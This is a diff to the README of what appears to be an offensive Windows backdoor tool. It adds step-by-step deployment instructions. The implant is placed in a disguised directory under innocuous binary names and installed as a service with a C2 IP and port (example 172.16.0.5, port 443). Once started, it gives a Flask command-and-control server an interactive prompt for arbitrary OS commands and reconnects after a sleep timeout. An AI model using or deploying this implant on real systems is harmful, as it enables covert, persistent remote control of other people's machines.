@@ -47,11 +47,42 @@ windows_Win32_Temp.dll
 windows_Win32_Temp.exe
 ```
 
-Creating the service on your target:
+Creating the service on your target and running:
 --------
-This is a generic method. Use your own loaders/stages to get the binaries on the host and run these commands.
+This is a generic method. Use your own loaders/stagers to get the binaries on the host and run these commands.
 
-Create the directory (this can be changed in the source code):
+1. Create the directory (this can be changed in the source code):
 ```
 mkdir C:\programdata\MicrosoftW
+```
+2. Move the binaries and DLL into this directory.
+3. As Administrator or with privileges allowing creation of services (Server Operators can start/stop service. Can not create them):
+```
+C:\programdata\MicrosoftW\windows_Win32_Temp.exe [C2 IP] [C2 Port; recommend 443] [service Binary Name] [service Binary Name] [desired timeout in seconds]
+```
+Example:
+```
+C:\programdata\MicrosoftW\windows_Win32_Temp.exe 172.16.0.5 443 myService myService 60
+```
+"service Binary Name" must be the same. Feel free to edit the source for yourself if you want to change this behavior.
+4. Start the service (reboot target or use Administrator/Server Operator):
+```
+sc.exe start [service Binary Name]
+
+OR with powershell
+
+Start-Service [service Binary Name]
+```
+
+You should see a prompt in the flask server terminal. It expects the following options:
+```
+"Enter initialization option: "
+
+Enter "1" to begin typing arbitrary OS commands such as "dir" or "powershell Get-Service".
+Enter "2" to end the session and tell the service to "sleep". It will sleep in seconds equal to what you put in the command line arguments above. So 60 seconds if using the example. After the time expires, the service will attempt to reconnect to your server.
+```
+
+When entering "1" to get the command, you should see the following:
+```
+Enter command: 
 ```
